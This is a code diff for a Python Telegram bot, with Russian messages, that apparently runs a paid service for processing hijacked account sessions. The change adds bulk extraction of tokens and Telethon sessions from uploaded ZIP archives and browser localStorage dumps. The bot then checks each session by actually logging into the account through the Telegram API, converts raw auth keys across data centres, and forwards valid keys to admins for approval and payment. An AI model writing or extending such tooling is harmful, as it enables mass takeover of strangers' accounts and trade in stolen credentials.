@@ -7,7 +7,9 @@ import asyncio
 import base64
 import struct
 import socket
-from typing import Dict, List, Optional
+import io
+import zipfile
+from typing import Dict, List, Optional, Tuple, Any
 
 import aiohttp
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -193,37 +195,121 @@ def db_mark_invoice_paid(invoice_id: str) -> Optional[sqlite3.Row]:
 
 BOT_TOKEN_REGEX = re.compile(r"^[0-9]{8,10}:[A-Za-z0-9_-]{35}$")
 
-def parse_web_token(text: str) -> Optional[str]:
-    """Извлекает чистый токен из JS-кода локального хранилища браузера."""
-    match = re.search(r'"token"\s*:\s*"([^"]+)"', text)
-    if match:
-        return match.group(1).strip()
-    match_single = re.search(r"'token'\s*:\s*'([^']+)'", text)
-    if match_single:
-        return match_single.group(1).strip()
-    match_raw = re.search(r'(?:auth_key|token|session)\s*[:=]\s*["\']?([A-Za-z0-9_\-]+)["\']?', text, re.IGNORECASE)
-    if match_raw:
-        return match_raw.group(1).strip()
-    return None
+def extract_tokens_from_line(line: str) -> List[str]:
+    """
+    Универсально и надежно разделяет строку.
+    Находит все вхождения токенов в JS localStorage / JSON / StringSession / Bot Tokens.
+    """
+    found = []
+    line = line.strip()
+    if not line or line.startswith("#"):
+        return found
 
-def clean_and_format_token(item: str) -> str:
-    item = item.strip()
-    extracted = parse_web_token(item)
-    if extracted:
-        item = extracted
-    item = item.strip("\"' \t\n\r")
-    return item
+    # 1. Поиск вложенных JSON-структур типа __oneme_auth
+    oneme_matches = re.findall(r'__oneme_auth[\'"]\s*,\s*[\'"]({.+?})[\'"]', line)
+    for om in oneme_matches:
+        try:
+            clean_json = om.replace('\\"', '"').replace("\\\\", "\\")
+            data = json.loads(clean_json)
+            if "token" in data and isinstance(data["token"], str):
+                found.append(data["token"].strip())
+        except Exception:
+            pass
 
-def extract_tokens(text: str) -> List[str]:
-    tokens = []
+    # 2. Поиск по ключам token/session/auth_key в JSON
+    json_token_matches = re.findall(r'"(?:token|session|auth_key)"\s*:\s*"([^"]+)"', line)
+    for m in json_token_matches:
+        clean = m.strip()
+        if len(clean) > 20:
+            found.append(clean)
+
+    single_token_matches = re.findall(r"'(?:token|session|auth_key)'\s*:\s*'([^']+)'", line)
+    for m in single_token_matches:
+        clean = m.strip()
+        if len(clean) > 20:
+            found.append(clean)
+
+    # 3. Ищем чистые Base64/StringSession строки
+    if not found:
+        potential_tokens = re.findall(r'([A-Za-z0-9_\-\+\/=]{40,})', line)
+        for pt in potential_tokens:
+            if pt.lower() in ['localstorage', 'sessionstorage', 'window', 'location', 'reload']:
+                continue
+            if len(pt) > 25:
+                found.append(pt.strip('"\''))
+
+    return found
+
+def extract_tokens_from_text(text: str) -> Tuple[List[str], int]:
+    """
+    Разбивает текст на список токенов.
+    Возвращает (список_уникальных_токенов, общее_колво_найденных_вхождений)
+    """
+    raw_tokens = []
+    if not isinstance(text, str):
+        return [], 0
+
+    try:
+        data = json.loads(text)
+        def parse_json_recursive(obj):
+            if isinstance(obj, str):
+                raw_tokens.extend(extract_tokens_from_line(obj))
+            elif isinstance(obj, dict):
+                for k, v in obj.items():
+                    if k.lower() in ['token', 'session', 'auth_key'] and isinstance(v, str):
+                        clean = v.strip()
+                        if len(clean) > 20:
+                            raw_tokens.append(clean)
+                    else:
+                        parse_json_recursive(v)
+            elif isinstance(obj, list):
+                for item in obj:
+                    parse_json_recursive(item)
+        parse_json_recursive(data)
+    except Exception:
+        pass
+
     for line in text.splitlines():
-        line = line.strip()
-        if not line or line.startswith("#"):
-            continue
-        cleaned = clean_and_format_token(line)
-        if cleaned:
-            tokens.append(cleaned)
-    return list(dict.fromkeys(tokens))
+        extracted = extract_tokens_from_line(line)
+        raw_tokens.extend(extracted)
+
+    cleaned_all = [t.strip('"\' \t\n\r') for t in raw_tokens if len(t.strip()) > 20]
+    unique_tokens = list(dict.fromkeys(cleaned_all))
+
+    return unique_tokens, len(cleaned_all)
+
+def extract_tokens_from_file_bytes(file_bytes: bytes, filename: str) -> Tuple[List[str], int, int]:
+    """
+    Распаковывает ZIP-архивы и извлекает все токены.
+    Возвращает: (уникальные_токены, общее_колво_найденных, колво_обработанных_файлов)
+    """
+    all_raw_tokens = []
+    files_processed = 0
+
+    if filename.lower().endswith('.zip') or file_bytes[:4] == b'PK\x03\x04':
+        try:
+            with zipfile.ZipFile(io.BytesIO(file_bytes)) as zf:
+                for zip_info in zf.infolist():
+                    if zip_info.is_dir() or zip_info.filename.startswith('__MACOSX') or zip_info.filename.endswith('.DS_Store'):
+                        continue
+                    try:
+                        content_bytes = zf.read(zip_info.filename)
+                        content_text = content_bytes.decode('utf-8', errors='ignore')
+                        file_tokens, _ = extract_tokens_from_text(content_text)
+                        all_raw_tokens.extend(file_tokens)
+                        files_processed += 1
+                    except Exception as ze:
+                        logging.error(f"Error reading {zip_info.filename} in zip: {ze}")
+        except Exception as e:
+            logging.error(f"Zip extract error: {e}")
+    else:
+        content_text = file_bytes.decode('utf-8', errors='ignore')
+        file_tokens, _ = extract_tokens_from_text(content_text)
+        all_raw_tokens.extend(file_tokens)
+        files_processed = 1
+
+    unique_tokens = list(dict.fromkeys(all_raw_tokens))
+    return unique_tokens, len(all_raw_tokens), files_processed
 
 async def validate_bot_token_real(token: str) -> dict:
     url = f"https://api.telegram.org/bot{token}/getMe"
@@ -247,7 +333,6 @@ def raw_key_to_string_session(raw_key_str: str, dc_id: int = 2) -> Optional[str]
             b64 += '=' * padding
             
         key_bytes = base64.b64decode(b64)
-        
         if len(key_bytes) >= 256:
             key_bytes = key_bytes[-256:]
             
@@ -281,7 +366,7 @@ async def try_connect_and_auth(session_obj) -> Optional[dict]:
     return None
 
 async def validate_telethon_session_real(session_string: str) -> dict:
-    session_string = clean_and_format_token(session_string)
+    session_string = session_string.strip('"\' \t\n\r')
     if not session_string:
         return {"valid": False, "reason": "Пустая строка сессии"}
 
@@ -297,7 +382,7 @@ async def validate_telethon_session_real(session_string: str) -> dict:
     except Exception:
         pass
 
-    # 2. Быстрый асинхронный поиск нужного DC для конвертированного AuthKey
+    # 2. Поиск нужного DC для конвертированного AuthKey
     tasks = []
     for dc in [2, 1, 4, 3, 5]:
         converted = raw_key_to_string_session(session_string, dc_id=dc)
@@ -317,7 +402,7 @@ async def validate_telethon_session_real(session_string: str) -> dict:
     return {"valid": False, "reason": "Сессия не авторизована или ключ сменен"}
 
 async def real_check_token_or_session(item: str) -> dict:
-    item = clean_and_format_token(item)
+    item = item.strip('"\' \t\n\r')
     if BOT_TOKEN_REGEX.match(item):
         return await validate_bot_token_real(item)
     try:
@@ -328,14 +413,14 @@ async def real_check_token_or_session(item: str) -> dict:
         return {"valid": False, "reason": f"Ошибка: {type(e).__name__}"}
 
 def convert_tokens(tokens: List[str], target_fmt: str) -> str:
-    cleaned_tokens = [clean_and_format_token(t) for t in tokens if clean_and_format_token(t)]
+    cleaned = [t.strip('"\' \t\n\r') for t in tokens if t.strip()]
     if target_fmt == "txt":
-        return "\n".join(cleaned_tokens)
+        return "\n".join(cleaned)
     elif target_fmt == "json":
-        return json.dumps([{"id": i + 1, "token": t} for i, t in enumerate(cleaned_tokens)], indent=4, ensure_ascii=False)
+        return json.dumps([{"id": i + 1, "token": t} for i, t in enumerate(cleaned)], indent=4, ensure_ascii=False)
     elif target_fmt == "web":
-        return json.dumps({"version": "1.0", "count": len(cleaned_tokens), "tokens": [{"token": t} for t in cleaned_tokens]}, indent=2, ensure_ascii=False)
-    return "\n".join(cleaned_tokens)
+        return json.dumps({"version": "1.0", "count": len(cleaned), "tokens": [{"token": t} for t in cleaned]}, indent=2, ensure_ascii=False)
+    return "\n".join(cleaned)
 
 # ==========================================
 # 💳 ПЛАТЕЖНЫЕ ФУНКЦИИ
@@ -729,7 +814,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not raw:
             await query.answer("Данные недоступны.", show_alert=True)
             return
-        toks = extract_tokens(raw)
+        toks, _ = extract_tokens_from_text(raw)
         converted = convert_tokens(toks, fmt)
         await context.bot.send_document(
             chat_id=user_id, document=bytes(converted, 'utf-8'), filename=f"tokens.{fmt}",
@@ -773,7 +858,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not state or "fmt_raw" not in state:
             await query.answer("Сначала отправьте токены.", show_alert=True)
             return
-        toks = extract_tokens(state["fmt_raw"])
+        toks, _ = extract_tokens_from_text(state["fmt_raw"])
         cost = len(toks) * PRICE_PER_TOKEN
         if not db_deduct_balance(user_id, cost):
             await query.answer(f"Недостаточно средств! Нужно {cost:.2f} $", show_alert=True)
@@ -781,7 +866,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         converted = convert_tokens(toks, fmt)
         await context.bot.send_document(
             chat_id=user_id, document=bytes(converted, 'utf-8'), filename=f"formatted.{fmt}",
-            caption=f"{E_CHECK} Готово! Токенов: <b>{len(toks)}</b>\nСписано: <b>{cost:.2f} $</b>",
+            caption=f"{E_CHECK} Готово! Уникальных токенов: <b>{len(toks)}</b>\nСписано: <b>{cost:.2f} $</b>",
             parse_mode='HTML'
         )
         USER_STATES.pop(user_id, None)
@@ -874,31 +959,40 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif step == "sending_tokens":
         category = state.get("category")
         count = state.get("count")
-        raw_content = ""
         file_name = "text_message.txt"
+        extracted = []
+        total_found = 0
+        files_cnt = 1
 
         if update.message.document:
             doc = update.message.document
             file_name = doc.file_name or "file"
             file_obj = await context.bot.get_file(doc.file_id)
             file_bytes = await file_obj.download_as_bytearray()
-            raw_content = file_bytes.decode('utf-8', errors='ignore')
+            extracted, total_found, files_cnt = extract_tokens_from_file_bytes(bytes(file_bytes), file_name)
         else:
             raw_content = update.message.text or ""
+            extracted, total_found = extract_tokens_from_text(raw_content)
 
-        extracted = extract_tokens(raw_content)
         if not extracted:
-            await update.message.reply_html(f"{E_CROSS} <b>Не найдено токенов или сессий!</b>", reply_markup=cancel_button())
+            await update.message.reply_html(
+                f"{E_CROSS} <b>Не найдено токенов или сессий!</b>\n"
+                f"Убедитесь, что внутри архива или сообщения находятся текстовые/JSON файлы с токенами.",
+                reply_markup=cancel_button()
+            )
             return
 
+        duplicates_count = total_found - len(extracted)
+
         status_msg = await update.message.reply_html(
-            f"🔄 <b>Проверяем вход в аккаунты по Telegram API...</b>\nЭто может занять некоторое время."
+            f"🔄 <b>Распаковано файлов: {files_cnt} шт.</b>\n"
+            f"🔍 <b>Найдено записей: {total_found} шт. (Уникальных: {len(extracted)}, Дубликатов: {duplicates_count})</b>\n"
+            f"Проверяем авторизацию в аккаунты по Telegram API..."
         )
 
         valid_tokens = []
         invalid_tokens = []
 
-        # Быстрая параллельная проверка всех сессий
         tasks = [real_check_token_or_session(item) for item in extracted]
         results = await asyncio.gather(*tasks, return_exceptions=True)
 
@@ -919,7 +1013,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reason_text = invalid_tokens[0][1].get("reason", "Не удалось войти") if invalid_tokens else "Ошибка сессии"
             await update.message.reply_html(
                 f"{E_CROSS} <b>Вход не выполнен! Заявка отклонена.</b>\n\n"
-                f"Все предоставленные сессии ({len(extracted)} шт.) невалидны, ключи сменены или отозваны.\n"
+                f"Все предоставленные уникальные сессии ({len(extracted)} шт.) невалидны, ключи сменены или отозваны.\n"
                 f"<i>Причина: {reason_text}</i>",
                 reply_markup=main_menu_buttons(is_admin)
             )
@@ -930,9 +1024,11 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         PENDING_TOKENS[req_id] = valid_raw
 
         await update.message.reply_html(
-            f"{E_PARTY} <b>Проверка успешно пройдена!</b>\n\n"
-            f"{E_CHECK} Успешных входов: <b>{len(valid_tokens)}</b> из <b>{len(extracted)}</b> шт.\n"
-            f"Заявка отправлена администраторам на утверждение.",
+            f"{E_PARTY} <b>Проверка завершена!</b>\n\n"
+            f"{E_CHECK} Валидных уникальных входов: <b>{len(valid_tokens)}</b> из <b>{len(extracted)}</b> шт.\n"
+            f"{E_WARN} Обнаружено дубликатов: <b>{duplicates_count}</b> шт.\n"
+            f"{E_CROSS} Невалидных/сгоревших: <b>{len(invalid_tokens)}</b> шт.\n"
+            f"Заявка на <b>{len(valid_tokens)} шт.</b> отправлена администраторам на утверждение.",
             reply_markup=main_menu_buttons(is_admin)
         )
 
@@ -941,8 +1037,8 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"{E_USER} <b>От:</b> @{user.username or 'NoUsername'}\n"
             f"<b>ID:</b> <code>{user_id}</code>\n"
             f"📁 Категория: <b>{category}</b>\n"
-            f"🔢 Заявлено: <b>{count} шт.</b>\n"
-            f"✅ Подтверждено входов: <b>{len(valid_tokens)} шт.</b>\n"
+            f"🔢 Заявлено пользователем: <b>{count} шт.</b>\n"
+            f"✅ Подтверждено уникальных входов: <b>{len(valid_tokens)} из {len(extracted)} шт.</b> (Дубликатов: {duplicates_count})\n"
             f"📄 Имя файла: <code>{file_name}</code>"
         )
 
@@ -957,7 +1053,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 else:
                     await context.bot.send_message(
                         chat_id=adm,
-                        text=adm_text + f"\n\n💬 <b>Валидные ключи:</b>\n<code>{valid_raw[:400]}</code>",
+                        text=adm_text + f"\n\n💬 <b>Валидные ключи ({len(valid_tokens)} шт.):</b>\n<code>{valid_raw[:400]}</code>",
                         parse_mode='HTML', reply_markup=admin_approval_buttons(req_id, len(valid_tokens))
                     )
             except Exception as e:
@@ -966,14 +1062,18 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif step == "format_awaiting":
         raw_content = ""
+        toks = []
+        total_found = 0
         if update.message.document:
             doc = update.message.document
             file_obj = await context.bot.get_file(doc.file_id)
-            raw_content = (await file_obj.download_as_bytearray()).decode('utf-8', errors='ignore')
+            file_bytes = await file_obj.download_as_bytearray()
+            toks, total_found, _ = extract_tokens_from_file_bytes(bytes(file_bytes), doc.file_name or "file")
+            raw_content = "\n".join(toks)
         else:
             raw_content = update.message.text or ""
+            toks, total_found = extract_tokens_from_text(raw_content)
 
-        toks = extract_tokens(raw_content)
         if not toks:
             await update.message.reply_html(f"{E_WARN} Не удалось найти токены.", reply_markup=cancel_button())
             return
@@ -981,23 +1081,28 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         state["fmt_raw"] = raw_content
         state["step"] = "format_choose"
         cost = len(toks) * PRICE_PER_TOKEN
+        duplicates = total_found - len(toks)
         await update.message.reply_html(
-            f"{E_CHECK} <b>Найдено токенов: {len(toks)}</b>\n"
+            f"{E_CHECK} <b>Найдено уникальных токенов: {len(toks)}</b> (Дубликатов: {duplicates})\n"
             f"{E_MONEY} Стоимость: <b>{cost:.2f} $</b>\n\n"
             f"{E_TOOLS} Выберите формат:",
             reply_markup=format_menu_buttons()
         )
 
     elif step == "check_awaiting":
-        raw_content = ""
+        tokens_to_check = []
+        total_found = 0
         if update.message.document:
             doc = update.message.document
             file_obj = await context.bot.get_file(doc.file_id)
-            raw_content = (await file_obj.download_as_bytearray()).decode('utf-8', errors='ignore')
+            file_bytes = await file_obj.download_as_bytearray()
+            extracted, total_found, _ = extract_tokens_from_file_bytes(bytes(file_bytes), doc.file_name or "file")
+            tokens_to_check = extracted[:10]
         else:
             raw_content = update.message.text or ""
+            extracted, total_found = extract_tokens_from_text(raw_content)
+            tokens_to_check = extracted[:10]
 
-        tokens_to_check = extract_tokens(raw_content)[:10]
         if not tokens_to_check:
             await update.message.reply_html(f"{E_WARN} Файл или сообщение пусты.", reply_markup=cancel_button())
             return
